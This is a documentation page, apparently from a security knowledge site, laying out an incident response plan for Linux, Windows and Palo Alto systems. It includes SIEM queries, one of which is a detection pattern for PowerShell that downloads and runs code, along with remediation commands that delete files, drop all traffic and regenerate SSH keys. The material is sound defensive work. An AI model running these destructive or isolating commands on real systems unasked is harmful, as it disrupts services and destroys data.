---
title: "IR Blueprint: Structured Response"
description: "A comprehensive Incident Response Plan covering Linux, Windows, and Palo Alto Firewall with deep technical details, real-world examples, step-by-step procedures, and best practices."
navigation:
  icon: i-lucide-shield-alert
---

## IR Blueprint: Structured Response Framework

A well-architected Incident Response (IR) plan is the backbone of any organization's cybersecurity posture. This framework provides a systematic, repeatable methodology for handling security incidents across Linux, Windows, and Palo Alto Firewall environments.

::note
This document follows the **NIST SP 800-61 Rev. 2** framework and incorporates **SANS Incident Handling** best practices. Every section includes real-world command examples, tool references, and actionable procedures.
::

---

## 1. Pre-Incident Readiness: Building Resilience

The preparation phase is the most critical and often most neglected phase of incident response. Without proper preparation, every other phase suffers.

### IR Foundation: Tools, Teams & Training

::card-group
  ::card
  ---
  title: IR Team Structure
  icon: i-lucide-users
  ---
  Define roles including IR Lead, Forensic Analyst, Network Analyst, Communications Lead, Legal Liaison, and Management Sponsor. Each role must have a primary and backup assignee.
  ::

  ::card
  ---
  title: IR Toolkit
  icon: i-lucide-wrench
  ---
  Maintain a pre-built forensic toolkit with write-blockers, bootable USB drives, network TAPs, forensic workstations, and licensed tools ready for deployment.
  ::

  ::card
  ---
  title: Training & Drills
  icon: i-lucide-graduation-cap
  ---
  Conduct tabletop exercises quarterly, red team/blue team exercises semi-annually, and full IR drills annually. Document all findings and improvements.
  ::

  ::card
  ---
  title: Documentation
  icon: i-lucide-file-text
  ---
  Maintain up-to-date network diagrams, asset inventories, baseline configurations, escalation procedures, and contact lists for all stakeholders.
  ::
::

### Readiness Assessment & Resource Allocation

::steps{level="4"}

#### Establish an Incident Response Policy

Create a formal, management-approved IR policy that defines what constitutes an incident, authority to act, and organizational commitment to incident response.

```text [IR-Policy-Essentials.txt]
IR Policy Must Include:
├── Definition of security incident
├── Authority and scope of IR team
├── Incident classification criteria (P1-P4)
├── Escalation thresholds and timelines
├── Legal and regulatory obligations
├── Evidence handling requirements
├── Communication protocols
└── Review and update schedule (minimum annual)
```

#### Build Your IR Toolkit

Prepare both physical and digital toolkits that are tested and ready before an incident occurs.

::tabs
  :::tabs-item{icon="i-lucide-monitor" label="Digital Toolkit"}
  ```text [Digital-IR-Toolkit.txt]
  Forensic Analysis:
  ├── Autopsy / Sleuth Kit (disk forensics)
  ├── Volatility 3 (memory analysis)
  ├── KAPE (artifact collection - Windows)
  ├── Velociraptor (endpoint investigation)
  └── Plaso / log2timeline (timeline creation)

  Network Analysis:
  ├── Wireshark / tshark (packet capture)
  ├── Zeek (network traffic analysis)
  ├── NetworkMiner (PCAP analysis)
  └── nmap (network scanning)

  Log Analysis:
  ├── ELK Stack (Elasticsearch, Logstash, Kibana)
  ├── Splunk
  ├── Graylog
  └── Chainsaw (Windows Event Log analysis)

  Malware Analysis:
  ├── REMnux (malware analysis distro)
  ├── Ghidra (reverse engineering)
  ├── YARA rules
  └── VirusTotal API access
  ```
  :::

  :::tabs-item{icon="i-lucide-hard-drive" label="Physical Toolkit"}
  ```text [Physical-IR-Toolkit.txt]
  Hardware:
  ├── Forensic write-blockers (USB, SATA, NVMe)
  ├── Bootable forensic USB drives (CAINE, Kali)
  ├── Portable forensic workstation
  ├── Network TAP devices
  ├── External storage (encrypted, sanitized)
  ├── Evidence bags and labels
  ├── Camera for physical documentation
  └── Chain of custody forms (printed)

  Cables & Adapters:
  ├── USB-A, USB-C, Micro-USB cables
  ├── SATA-to-USB adapters
  ├── Ethernet crossover cables
  └── Console cables (RJ45-to-USB)
  ```
  :::
::

#### Define Incident Classification Matrix

```text [Incident-Classification-Matrix.txt]
┌──────────┬────────────────────────────┬───────────────┬──────────────────┐
│ Severity │ Description                │ Response Time │ Escalation       │
├──────────┼────────────────────────────┼───────────────┼──────────────────┤
│ P1       │ Active data breach,        │ Immediate     │ CISO, Legal,     │
│ Critical │ ransomware, APT            │ (< 15 min)    │ Executive Team   │
├──────────┼────────────────────────────┼───────────────┼──────────────────┤
│ P2       │ Confirmed malware,         │ < 1 hour      │ IR Lead,         │
│ High     │ privilege escalation       │               │ Security Manager │
├──────────┼────────────────────────────┼───────────────┼──────────────────┤
│ P3       │ Suspicious activity,       │ < 4 hours     │ IR Analyst,      │
│ Medium   │ policy violations          │               │ Team Lead        │
├──────────┼────────────────────────────┼───────────────┼──────────────────┤
│ P4       │ Informational alerts,      │ < 24 hours    │ SOC Analyst      │
│ Low      │ false positive triage      │               │                  │
└──────────┴────────────────────────────┴───────────────┴──────────────────┘
```

#### Establish Communication Channels

Set up secure, out-of-band communication channels that remain available even if primary infrastructure is compromised.

```text [Communication-Channels.txt]
Primary:    Encrypted Slack/Teams channel (IR-only)
Secondary:  Signal group chat (mobile)
Tertiary:   Encrypted email (PGP/S-MIME)
Emergency:  Phone tree (printed, distributed)
War Room:   Designated physical location with whiteboard

NEVER use potentially compromised email or messaging systems
for IR communications during an active incident.
```

::

::tip
**Pro Tip:** Store your IR toolkit on a dedicated, encrypted USB drive that is updated quarterly. Include offline copies of critical documentation, as network access may be unavailable during a major incident.
::

---

## 2. Early Warning: Detection & Triage

Detection is the phase where security events are identified, analyzed, and classified as potential incidents.

### IOC Hunting: Finding the Foothold

::accordion
  :::accordion-item{icon="i-lucide-search" label="Common Indicators of Compromise (IOCs)"}
  ```text [IOC-Categories.txt]
  Network-Based IOCs:
  ├── Unusual outbound connections to known bad IPs
  ├── DNS queries to DGA-generated domains
  ├── Beaconing patterns (regular interval callbacks)
  ├── Large data transfers at unusual hours
  ├── Connections on non-standard ports
  └── Encrypted traffic to unexpected destinations

  Host-Based IOCs:
  ├── Unexpected processes or services
  ├── Modified system files or binaries
  ├── New user accounts or privilege changes
  ├── Unusual scheduled tasks or cron jobs
  ├── Registry modifications (Windows)
  ├── Unexpected kernel modules (Linux)
  └── Anti-forensic tool artifacts

  Email-Based IOCs:
  ├── Phishing emails with malicious attachments
  ├── Spoofed sender addresses
  ├── Suspicious URLs in email bodies
  └── Unusual email forwarding rules
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Detection Sources & Methods"}
  ```text [Detection-Sources.txt]
  Automated Detection:
  ├── SIEM alerts (correlation rules)
  ├── EDR/XDR alerts (behavioral detection)
  ├── IDS/IPS alerts (signature matching)
  ├── Firewall alerts (policy violations)
  ├── DLP alerts (data exfiltration)
  └── Email gateway alerts (malware/phishing)

  Manual Detection:
  ├── User reports (phishing, suspicious activity)
  ├── Threat hunting exercises
  ├── Vulnerability scan results
  ├── Third-party notifications (ISP, law enforcement)
  └── Dark web monitoring alerts
  ```
  :::

  :::accordion-item{icon="i-lucide-clipboard-check" label="Initial Triage Checklist"}
  ```text [Triage-Checklist.txt]
  □ Document the initial alert/report details
  □ Record exact date, time, and timezone
  □ Identify affected systems and users
  □ Determine initial scope of impact
  □ Classify incident severity (P1-P4)
  □ Assign incident number and tracking
  □ Notify appropriate team members
  □ Begin evidence preservation immediately
  □ Check for related alerts in SIEM
  □ Document all actions taken with timestamps
  ```
  :::
::

### Alert Analysis: Separating Signal from Noise

Real-world detection involves filtering through massive volumes of alerts. Here is a practical approach:

```bash [SIEM-Query-Examples.sh]
# Splunk - Find failed login attempts followed by success (brute force)
index=auth sourcetype=linux_secure 
| stats count by src_ip, user, action 
| where action="failure" AND count > 5

# Splunk - Detect beaconing behavior
index=firewall sourcetype=pan:traffic 
| bin _time span=60s 
| stats count by src_ip, dst_ip, _time 
| eventstats stdev(count) as std, avg(count) as avg by src_ip, dst_ip 
| where std < 1 AND count > 10

# ELK/Kibana KQL - Suspicious PowerShell execution
event.code: "4104" AND powershell.scriptblock.text: (*Invoke-Expression* OR *IEX* OR *DownloadString* OR *EncodedCommand*)
```

::warning
**Never dismiss repeated low-severity alerts.** Advanced attackers deliberately trigger low-priority events to blend in with noise. Correlate multiple low-severity alerts across different detection sources — if three or more independent sources flag the same asset within a 24-hour window, escalate immediately.
::

---

## 3. Breach Control: Isolation Techniques

Containment prevents the incident from spreading further while preserving evidence for investigation.

### Short-Term vs Long-Term Containment

::tabs
  :::tabs-item{icon="i-lucide-zap" label="Short-Term Containment"}
  Immediate actions taken within minutes to hours to stop active threats.

  ```text [Short-Term-Actions.txt]
  Network Isolation:
  ├── Disconnect affected host from network (physical or VLAN)
  ├── Block malicious IPs at firewall
  ├── Disable compromised user accounts
  ├── Kill malicious processes
  └── Isolate endpoint via EDR

  Do NOT:
  ├── Power off systems (destroys volatile evidence)
  ├── Delete malicious files before imaging
  ├── Alert the attacker (if APT suspected)
  └── Reimage before forensic capture
  ```

  **Linux - Network Isolation:**
  ```bash [linux-containment.sh]
  # Isolate host by dropping all network traffic except management
  sudo iptables -I INPUT -j DROP
  sudo iptables -I OUTPUT -j DROP
  sudo iptables -I INPUT -s <management-ip> -j ACCEPT
  sudo iptables -I OUTPUT -d <management-ip> -j ACCEPT

  # Kill a suspicious process by PID
  sudo kill -9 <PID>

  # Disable a compromised user account immediately
  sudo usermod -L compromised_user
  sudo pkill -u compromised_user
  ```

  **Windows - Network Isolation:**
  ```powershell [windows-containment.ps1]
  # Isolate host using Windows Firewall
  New-NetFirewallRule -DisplayName "IR-BlockAll-In" -Direction Inbound -Action Block -Enabled True
  New-NetFirewallRule -DisplayName "IR-BlockAll-Out" -Direction Outbound -Action Block -Enabled True
  New-NetFirewallRule -DisplayName "IR-AllowMgmt-In" -Direction Inbound -RemoteAddress <management-ip> -Action Allow -Enabled True
  New-NetFirewallRule -DisplayName "IR-AllowMgmt-Out" -Direction Outbound -RemoteAddress <management-ip> -Action Allow -Enabled True

  # Disable compromised account
  Disable-LocalUser -Name "compromised_user"
  # Or in Active Directory
  Disable-ADAccount -Identity "compromised_user"
  ```

  **Palo Alto Firewall - Block Malicious IPs:**
  ```text [pa-containment.txt]
  # CLI - Add IP to block list
  > set cli pager off
  > configure
  # set address Blocked-Attacker-IP ip-netmask 203.0.113.50/32
  # set security policy rules Emergency-Block from any to any source Blocked-Attacker-IP action deny
  # set security policy rules Emergency-Block log-start yes log-end yes
  # move security policy rules Emergency-Block top
  # commit

  # Or via Dynamic Block List (EDL) for multiple IPs
  # Add IPs to external block list and reference in security policy
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Long-Term Containment"}
  Sustainable measures that allow business operations while maintaining security controls.

  ```text [Long-Term-Actions.txt]
  Infrastructure Changes:
  ├── Implement network segmentation
  ├── Deploy additional monitoring on affected segments
  ├── Patch identified vulnerabilities
  ├── Rotate all credentials (service accounts, API keys)
  ├── Rebuild compromised systems from known-good images
  ├── Implement additional access controls
  └── Deploy temporary honeypots to detect lateral movement

  Evidence Preservation:
  ├── Create forensic images of all affected systems
  ├── Capture memory dumps before any remediation
  ├── Preserve all relevant logs
  ├── Document network topology changes
  └── Maintain chain of custody for all evidence
  ```
  :::
::

### Network Segmentation: Cutting Off Access

```text [Segmentation-Strategy.txt]
Before Containment:
┌─────────────────────────────────────────────┐
│                FLAT NETWORK                  │
│  [Server1] [Server2] [Workstation] [Attacker]│
│  All systems can communicate freely          │
└─────────────────────────────────────────────┘

After Containment:
┌──────────────┐    ┌──────────────┐    ┌─────────────┐
│  QUARANTINE   │    │  PRODUCTION   │    │  MANAGEMENT  │
│  VLAN 999     │    │  VLAN 10      │    │  VLAN 100    │
│  [Compromised]│    │  [Clean Hosts]│    │  [IR Team]   │
│  No Internet  │    │  Monitored    │    │  Full Access  │
│  No lateral   │    │  Normal ops   │    │  Forensic WS  │
└──────────────┘    └──────────────┘    └─────────────┘
     │ Blocked          │ Filtered         │ Allowed
     └──────────────────┴──────────────────┘
```

---

## 4. Root Cause Removal: Cleanup Operations

Eradication ensures the threat is completely removed from the environment.

### Malware Purge: Eliminating Threats

::steps{level="4"}

#### Identify All Compromised Systems

Before removing anything, ensure you have identified every system the attacker accessed.

```bash [identify-compromised-linux.sh]
# Search for IOCs across all Linux systems
# Find files modified in the last 7 days in suspicious locations
find /tmp /var/tmp /dev/shm /opt -type f -mtime -7 -ls 2>/dev/null

# Check for unauthorized SSH keys
for user_dir in /home/*; do
  if [ -f "$user_dir/.ssh/authorized_keys" ]; then
    echo "=== $user_dir/.ssh/authorized_keys ==="
    cat "$user_dir/.ssh/authorized_keys"
  fi
done

# Check root's authorized_keys
cat /root/.ssh/authorized_keys 2>/dev/null

# Find SUID/SGID files that shouldn't exist
find / -perm /6000 -type f 2>/dev/null | sort > /tmp/suid_current.txt
# Compare against known baseline
diff /tmp/suid_baseline.txt /tmp/suid_current.txt
```

```powershell [identify-compromised-windows.ps1]
# Search for recently created executables
Get-ChildItem -Path C:\ -Recurse -Include *.exe,*.dll,*.ps1,*.bat,*.vbs -ErrorAction SilentlyContinue |
  Where-Object { $_.CreationTime -gt (Get-Date).AddDays(-7) } |
  Select-Object FullName, CreationTime, LastWriteTime, Length |
  Sort-Object CreationTime -Descending

# Check for persistence in startup locations
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User

# Check scheduled tasks for suspicious entries
Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } |
  Select-Object TaskName, TaskPath, State |
  Format-Table -AutoSize

# Review autoruns (requires Sysinternals Autoruns)
autorunsc.exe -accepteula -a * -c -h -s -v -vt | Out-File C:\IR\autoruns_output.csv
```

#### Remove Malicious Artifacts

```bash [remove-malware-linux.sh]
# Remove identified malicious files (after forensic imaging!)
sudo rm -f /tmp/.hidden_backdoor
sudo rm -f /var/tmp/cryptominer
sudo rm -rf /opt/.malware_directory/

# Remove unauthorized cron jobs
sudo crontab -l -u compromised_user  # Review first
sudo crontab -r -u compromised_user  # Then remove

# Check and clean /etc/cron.d/ and /etc/cron.daily/
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/

# Remove unauthorized SSH keys
sudo rm /home/compromised_user/.ssh/authorized_keys

# Remove malicious systemd services
sudo systemctl stop malicious-service
sudo systemctl disable malicious-service
sudo rm /etc/systemd/system/malicious-service.service
sudo systemctl daemon-reload

# Remove malicious kernel modules
sudo rmmod malicious_module
sudo rm /lib/modules/$(uname -r)/kernel/drivers/malicious_module.ko
sudo depmod -a
```

```powershell [remove-malware-windows.ps1]
# Remove malicious scheduled tasks
Unregister-ScheduledTask -TaskName "MaliciousTask" -Confirm:$false

# Remove malicious registry persistence
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousEntry"
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousEntry"

# Remove malicious services
Stop-Service -Name "MaliciousService" -Force
sc.exe delete "MaliciousService"

# Remove malicious WMI event subscriptions
Get-WmiObject -Namespace root\subscription -Class __EventFilter |
  Where-Object { $_.Name -like "*Malicious*" } |
  Remove-WmiObject

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object { $_.Name -like "*Malicious*" } |
  Remove-WmiObject

# Remove malicious files
Remove-Item -Path "C:\Windows\Temp\malware.exe" -Force
Remove-Item -Path "C:\Users\Public\backdoor.ps1" -Force
```

#### Patch and Remediate Vulnerabilities

```bash [patch-linux.sh]
# Update all packages to latest versions
sudo apt update && sudo apt upgrade -y   # Debian/Ubuntu
sudo yum update -y                        # RHEL/CentOS 7
sudo dnf update -y                        # RHEL/CentOS 8+/Fedora

# Specifically patch the exploited vulnerability
sudo apt install --only-upgrade <vulnerable-package>

# Verify patch was applied
dpkg -l | grep <package-name>
rpm -qa | grep <package-name>

# Harden SSH configuration
sudo cat >> /etc/ssh/sshd_config << 'EOF'
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
AllowUsers authorized_user1 authorized_user2
Protocol 2
X11Forwarding no
EOF
sudo systemctl restart sshd
```

#### Credential Reset

```bash [credential-reset.sh]
# Force password change for all affected users (Linux)
for user in user1 user2 user3; do
  sudo passwd -e "$user"  # Expire password, force change on next login
done

# Rotate SSH host keys
sudo rm /etc/ssh/ssh_host_*
sudo ssh-keygen -A
sudo systemctl restart sshd

# Rotate service account passwords and API keys
# Document each rotation with timestamp
echo "$(date -u '+%Y-%m-%d %H:%M:%S UTC') - Rotated credentials for service: webapp_db_user" >> /var/log/ir/credential_rotation.log
```

```powershell [credential-reset-windows.ps1]
# Force password reset for domain users
$affectedUsers = @("user1", "user2", "user3")
foreach ($user in $affectedUsers) {
    Set-ADUser -Identity $user -ChangePasswordAtLogon $true
    Write-Host "Password reset forced for: $user"
}

# Reset the KRBTGT account (do this TWICE, 12 hours apart)
# This invalidates all Kerberos tickets (Golden Ticket mitigation)
Reset-KrbtgtKeyInteractive  # Or use the KRBTGT reset script from Microsoft

# Rotate all service account passwords
# Document each change
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
"$timestamp - Rotated: svc_webapp password" | Out-File -Append C:\IR\credential_rotation.log
```

::

::caution
**KRBTGT Reset Warning:** Resetting the KRBTGT account password invalidates ALL existing Kerberos tickets in the domain. This will cause temporary authentication disruptions. Perform this twice — the second reset 12-24 hours after the first — to invalidate any tickets generated between resets. Always do this during a maintenance window.
::

---

## 5. Business Continuity: Restoration Phase

Recovery involves returning affected systems to normal operations in a controlled and verified manner.

### System Revival: Returning to Operations

::steps{level="4"}

#### Rebuild from Known-Good Media

Never trust a compromised system. Rebuild from verified, clean images.

```bash [rebuild-linux.sh]
# Verify integrity of installation media
sha256sum ubuntu-24.04-server-amd64.iso
# Compare against published hash from official source

# After fresh OS installation, apply hardened baseline
# CIS Benchmark hardening script example
sudo apt install -y libpam-pwquality auditd aide
sudo cp /etc/security/pwquality.conf /etc/security/pwquality.conf.bak

# Configure password policy
sudo tee /etc/security/pwquality.conf << 'EOF'
minlen = 14
dcredit = -1
ucredit = -1
ocredit = -1
lcredit = -1
maxrepeat = 3
EOF

# Enable and configure auditd
sudo systemctl enable auditd
sudo systemctl start auditd

# Add critical audit rules
sudo tee -a /etc/audit/rules.d/ir-monitoring.rules << 'EOF'
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-w /var/log/auth.log -p wa -k auth_log
-a always,exit -F arch=b64 -S execve -k exec_commands
EOF
sudo augenrules --load
```

```powershell [rebuild-windows.ps1]
# After fresh Windows installation from verified media
# Apply security baseline using Microsoft Security Compliance Toolkit

# Import and apply GPO baseline
Import-GPO -BackupGpoName "Windows-Server-2022-Security-Baseline" -Path "C:\SecurityBaselines\" -TargetName "IR-Hardened-Baseline"

# Enable advanced audit policies
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /category:"Account Logon" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable
auditpol /set /category:"Privilege Use" /success:enable /failure:enable
auditpol /set /category:"Process Tracking" /success:enable /failure:enable
auditpol /set /category:"Policy Change" /success:enable /failure:enable

# Enable PowerShell Script Block Logging
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Enable PowerShell Module Logging
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1
```

#### Restore Data from Clean Backups

```bash [restore-data.sh]
# Verify backup integrity before restoration
sha256sum /backup/2024-01-15/database_backup.sql.gz
# Compare against stored hash from backup manifest

# Restore from verified backup
gunzip -c /backup/2024-01-15/database_backup.sql.gz | mysql -u root -p database_name

# Scan restored files for malware before going live
clamscan -r --infected --remove /restored/data/
```

#### Validate System Integrity

```bash [validate-linux.sh]
# Initialize AIDE database on clean system
sudo aideinit
sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Run initial integrity check
sudo aide --check

# Verify no unauthorized network listeners
sudo ss -tlnp
sudo ss -ulnp

# Verify running processes against baseline
ps auxf > /tmp/running_processes.txt
# Compare against known-good process list
```

```powershell [validate-windows.ps1]
# Verify system file integrity
sfc /scannow
DISM /Online /Cleanup-Image /RestoreHealth

# Check for unauthorized services
Get-Service | Where-Object { $_.Status -eq "Running" } |
  Select-Object Name, DisplayName, StartType |
  Export-Csv C:\IR\running_services.csv -NoTypeInformation

# Verify no unauthorized network listeners
Get-NetTCPConnection -State Listen |
  Select-Object LocalAddress, LocalPort, OwningProcess,
    @{Name="ProcessName";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}} |
  Format-Table -AutoSize
```

#### Monitor Restored Systems Closely

```text [Enhanced-Monitoring.txt]
Post-Recovery Monitoring Plan (30 days minimum):
├── Day 1-7:   24/7 SOC monitoring with lowered alert thresholds
├── Day 8-14:  Enhanced log review twice daily
├── Day 15-21: Daily log review with automated alerting
├── Day 22-30: Standard monitoring with weekly manual review
└── Day 30+:   Return to normal monitoring with improved baselines

Additional Monitoring:
├── Deploy network captures on restored segments
├── Enable verbose logging on all restored systems
├── Set up file integrity monitoring
├── Monitor for callback attempts to known C2 IPs
└── Watch for re-infection indicators
```

::

---

## 6. After-Action Review: Continuous Improvement

The lessons learned phase transforms incident pain into organizational strength.

### Post-Mortem Analysis: Learning from Crisis

::field-group
  ::field{name="meeting_timeline" type="string"}
  Hold the post-incident review meeting within **5-10 business days** after incident closure. This allows enough time for documentation while memories are still fresh.
  ::

  ::field{name="attendees" type="string[]"}
  Include all IR team members, affected system owners, management representatives, legal counsel (if applicable), and any external consultants involved.
  ::

  ::field{name="documentation" type="object"}
  Produce a formal incident report containing timeline, impact assessment, root cause analysis, actions taken, and improvement recommendations.
  ::
::

```text [Post-Incident-Report-Template.txt]
INCIDENT REPORT TEMPLATE
========================

1. Executive Summary
   ├── Incident ID: IR-2024-0042
   ├── Date Range: 2024-01-15 to 2024-01-18
   ├── Severity: P1 - Critical
   ├── Type: Ransomware / Data Exfiltration
   └── Status: Closed

2. Incident Timeline
   ├── 2024-01-15 03:42 UTC - Initial compromise via phishing email
   ├── 2024-01-15 04:15 UTC - Lateral movement to file server
   ├── 2024-01-15 06:30 UTC - Data exfiltration began
   ├── 2024-01-16 08:00 UTC - SIEM alert triggered
   ├── 2024-01-16 08:15 UTC - IR team activated
   ├── 2024-01-16 08:45 UTC - Containment initiated
   ├── 2024-01-17 14:00 UTC - Eradication completed
   └── 2024-01-18 10:00 UTC - Recovery completed

3. Impact Assessment
   ├── Systems affected: 12 servers, 45 workstations
   ├── Data exposed: Customer PII (estimated 50,000 records)
   ├── Financial impact: $2.3M (estimated)
   ├── Operational downtime: 26 hours
   └── Regulatory implications: GDPR notification required

4. Root Cause Analysis
   ├── Initial vector: Spear-phishing email with macro-enabled document
   ├── Exploitation: CVE-2024-XXXX (unpatched vulnerability)
   ├── Lateral movement: Pass-the-Hash using cached credentials
   └── Contributing factors:
       ├── Delayed patching (30-day window exceeded)
       ├── Overly permissive service account
       └── Lack of network segmentation

5. Recommendations
   ├── Implement 14-day patch SLA for critical vulnerabilities
   ├── Deploy LAPS for local administrator passwords
   ├── Implement network micro-segmentation
   ├── Enhance email filtering (sandbox attachments)
   └── Conduct quarterly phishing simulations
```

### Improvement Roadmap: Closing Gaps

::card-group
  ::card
  ---
  title: Quick Wins (0-30 days)
  icon: i-lucide-zap
  ---
  - Enable MFA on all remote access
  - Reset all privileged credentials
  - Update EDR signatures and policies
  - Block identified IOCs across all controls
  - Update IR playbooks with lessons learned
  ::

  ::card
  ---
  title: Short-Term (30-90 days)
  icon: i-lucide-clock
  ---
  - Implement network segmentation
  - Deploy additional SIEM use cases
  - Conduct security awareness training
  - Review and update firewall rules
  - Implement privileged access management
  ::

  ::card
  ---
  title: Medium-Term (90-180 days)
  icon: i-lucide-calendar
  ---
  - Deploy zero-trust architecture components
  - Implement automated response playbooks
  - Conduct purple team exercises
  - Upgrade logging infrastructure
  - Implement data loss prevention (DLP)
  ::

  ::card
  ---
  title: Long-Term (180-365 days)
  icon: i-lucide-target
  ---
  - Complete zero-trust implementation
  - Achieve SOC 2 / ISO 27001 compliance
  - Implement deception technology
  - Build threat intelligence program
  - Establish bug bounty program
  ::
::

---

## 7. Crisis Communication: Stakeholder Updates

### Transparency Protocols: Internal & External Comms

::tabs
  :::tabs-item{icon="i-lucide-building" label="Internal Communication"}
  ```text [Internal-Comms-Template.txt]
  INTERNAL INCIDENT NOTIFICATION
  ==============================
  Classification: CONFIDENTIAL - IR TEAM ONLY
  
  Subject: Security Incident IR-2024-0042 - [Status Update #X]
  
  Summary:
  At [TIME] on [DATE], the Security Operations team detected
  [brief description]. The Incident Response team has been 
  activated and is currently in the [PHASE] phase.
  
  Current Status:
  - Containment: [Complete/In Progress]
  - Affected Systems: [List]
  - Business Impact: [Description]
  - Estimated Recovery: [Timeline]
  
  Required Actions:
  - [Department]: [Specific action required]
  - [Department]: [Specific action required]
  
  Next Update: [DATE/TIME]
  
  Contact: IR Lead - [Name] - [Secure Contact Method]
  
  DO NOT forward this communication outside the distribution list.
  DO NOT discuss incident details on unsecured channels.
  ```
  :::

  :::tabs-item{icon="i-lucide-globe" label="External Communication"}
  ```text [External-Comms-Template.txt]
  PUBLIC INCIDENT NOTIFICATION
  ============================
  (Reviewed by Legal before release)
  
  [Company Name] Security Incident Notice
  Date: [DATE]
  
  We are writing to inform you of a security incident that 
  may have affected your personal information.
  
  What Happened:
  On [DATE], we discovered unauthorized access to certain 
  systems containing [type of data]. We immediately activated 
  our incident response procedures and engaged leading 
  cybersecurity experts to assist with our investigation.
  
  What Information Was Involved:
  [Specific types of data potentially affected]
  
  What We Are Doing:
  - Engaged third-party forensic investigators
  - Notified law enforcement
  - Enhanced security controls
  - Providing [credit monitoring/identity protection] services
  
  What You Can Do:
  - Monitor your accounts for suspicious activity
  - Enable multi-factor authentication where available
  - Be cautious of phishing attempts referencing this incident
  
  For More Information:
  Dedicated incident hotline: [PHONE]
  Incident website: [URL]
  Email: [incident-response@company.com]
  ```
  :::

  :::tabs-item{icon="i-lucide-scale" label="Regulatory Notification"}
  ```text [Regulatory-Notification-Checklist.txt]
  REGULATORY NOTIFICATION REQUIREMENTS
  =====================================
  
  GDPR (EU/UK):
  ├── Timeline: 72 hours from discovery
  ├── Authority: Supervisory Authority (DPA)
  ├── Content: Nature of breach, categories of data,
  │   approximate number of subjects, consequences,
  │   measures taken
  └── Data subjects: "Without undue delay" if high risk
  
  HIPAA (US Healthcare):
  ├── Timeline: 60 days from discovery
  ├── Authority: HHS Office for Civil Rights
  ├── Content: Description, types of information,
  │   steps taken, steps individuals should take
  └── If >500 individuals: Notify prominent media
  
  PCI DSS (Payment Card):
  ├── Timeline: Immediately upon discovery
  ├── Authority: Payment card brands (Visa, MC, etc.)
  ├── Content: Forensic investigation report
  └── Requirement: Engage PFI (PCI Forensic Investigator)
  
  State Breach Notification (US):
  ├── Timeline: Varies by state (24hrs to 90 days)
  ├── Authority: State Attorney General
  └── Note: Must comply with EACH affected state's law
  
  SEC (Publicly Traded Companies):
  ├── Timeline: 4 business days (material incidents)
  ├── Filing: Form 8-K
  └── Content: Nature, scope, timing, material impact
  ```
  :::
::

---

## Linux Forensics: IR on *NIX Systems

::note
This section provides comprehensive Linux incident response procedures with real commands, expected outputs, and analysis techniques for each investigation area.
::

---

### 1. Log Forensics: Tracking Digital Footprints

Linux logs are the primary source of evidence during incident response. Understanding where logs are stored and how to analyze them is fundamental.

#### Authentication Trail: Login Analysis

```bash [auth-log-analysis.sh]
# ===== AUTH.LOG / SECURE LOG ANALYSIS =====

# Location varies by distribution:
# Debian/Ubuntu: /var/log/auth.log
# RHEL/CentOS:   /var/log/secure
# Systemd:       journalctl -u sshd

# --- Failed Login Attempts ---
# Find all failed SSH login attempts
grep "Failed password" /var/log/auth.log | tail -20

# Example output:
# Jan 15 03:42:15 server sshd[12345]: Failed password for root from 203.0.113.50 port 54321 ssh2
# Jan 15 03:42:17 server sshd[12345]: Failed password for root from 203.0.113.50 port 54322 ssh2

# Count failed attempts by source IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# Example output:
# 4523 203.0.113.50
#  891 198.51.100.25
#  234 192.0.2.100

# --- Successful Logins ---
grep "Accepted" /var/log/auth.log | tail -20

# Example output:
# Jan 15 04:15:03 server sshd[12346]: Accepted publickey for admin from 10.0.1.50 port 43210 ssh2

# --- Successful logins from unusual IPs ---
# Compare against known good IP list
grep "Accepted" /var/log/auth.log | awk '{print $1,$2,$3,$9,$11}' | sort -k4 | uniq

# --- Check for privilege escalation ---
grep "sudo" /var/log/auth.log | grep -v "session opened\|session closed"

# Example output:
# Jan 15 04:20:33 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash

# --- Check for new user creation ---
grep "useradd\|adduser\|newusers" /var/log/auth.log

# Example output:
# Jan 15 04:25:00 server useradd[12400]: new user: name=backdoor_user, UID=1001, GID=1001

# --- Check for su (switch user) attempts ---
grep "su:" /var/log/auth.log | grep -i "authentication failure\|FAILED"
```

#### Syslog Deep Dive: System Event Investigation

```bash [syslog-analysis.sh]
# ===== SYSLOG ANALYSIS =====

# --- Check for service restarts (may indicate tampering) ---
grep -i "restart\|started\|stopped" /var/log/syslog | grep -v "session"

# --- Check for kernel messages indicating exploitation ---
grep -i "segfault\|kernel panic\|out of memory\|oom-killer" /var/log/kern.log
grep -i "segfault\|general protection" /var/log/syslog

# Example output (buffer overflow indicator):
# Jan 15 03:42:10 server kernel: [12345.678] nginx[5678]: segfault at 7fff12345678 ip 00007f1234567890

# --- Check for cron job execution ---
grep "CRON" /var/log/syslog | tail -30

# Example output:
